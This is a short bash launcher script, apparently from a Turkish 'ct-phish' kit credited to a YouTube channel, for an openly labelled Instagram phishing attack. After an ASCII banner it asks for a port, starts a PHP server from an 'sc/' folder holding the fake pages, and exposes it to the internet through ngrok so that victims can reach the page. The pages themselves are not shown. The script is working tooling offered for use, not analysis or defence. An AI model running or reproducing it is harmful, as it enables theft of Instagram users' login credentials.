echo '      _                _     _     _     '
echo '     | |              | |   (_)   | |    '
echo '  ___| |_ ______ _ __ | |__  _ ___| |__  '
echo ' / __| __|______|  _ \|  _ \| / __|  _ \ '
echo '| (__| |_       | |_) | | | | \__ \ | | |'
echo ' \___|\__|      | .__/|_| |_|_|___/_| |_|'
echo '                | |                      '
echo '                |_|                      '
echo -e "\033[31;40;1m
\033[31;40;1m[-]\e[37mİnstagram Phishing          \033[31;40;1m[-]\e[37mYouTube: CyberTech HD
"
echo ''
echo ''
echo ''
read -p "Başlatmak İçin 1 Yazın:  " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: ctphish"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd sc/
	php -S 127.0.0.1:$port > -t & ngrok http $port
fi